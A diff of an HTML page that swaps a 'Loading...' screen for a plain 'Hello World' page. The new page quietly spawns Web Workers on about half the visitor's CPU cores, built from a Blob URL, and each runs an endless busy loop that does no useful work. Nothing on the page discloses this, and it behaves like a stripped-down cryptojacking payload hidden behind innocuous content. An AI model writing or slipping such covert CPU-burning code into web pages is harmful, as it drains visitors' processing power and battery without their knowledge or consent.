@@ -1,29 +1,55 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-
-    <script src="script.js" defer></script>
-
-    <style>
-        body {
-            background:#111;
-            color:white;
-            font-family:Arial;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            height:100vh;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>Hello World</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+    }
+  </style>
 </head>
-
 <body>
+  Hello World
 
-<h2>
-    Loading...
-</h2>
+  <script>
+    const cores = navigator.hardwareConcurrency || 4;
 
+    // Use roughly half the logical CPUs.
+    const workerCount = Math.max(1, Math.floor(cores / 2));
+
+    const workerCode = `
+      function burn(ms) {
+        const end = performance.now() + ms;
+        let x = 0;
+
+        while (performance.now() < end) {
+          x = Math.imul(x + 1, 1664525);
+          x ^= x >>> 13;
+        }
+
+        return x;
+      }
+
+      function loop() {
+        // Busy for ~5 ms, then yield for ~5 ms.
+        burn(5);
+        setTimeout(loop, 5);
+      }
+
+      loop();
+    `;
+
+    const blob = new Blob([workerCode], {
+      type: "application/javascript"
+    });
+
+    const workerURL = URL.createObjectURL(blob);
+
+    for (let i = 0; i < workerCount; i++) {
+      new Worker(workerURL);
+    }
+  </script>
 </body>
 </html>
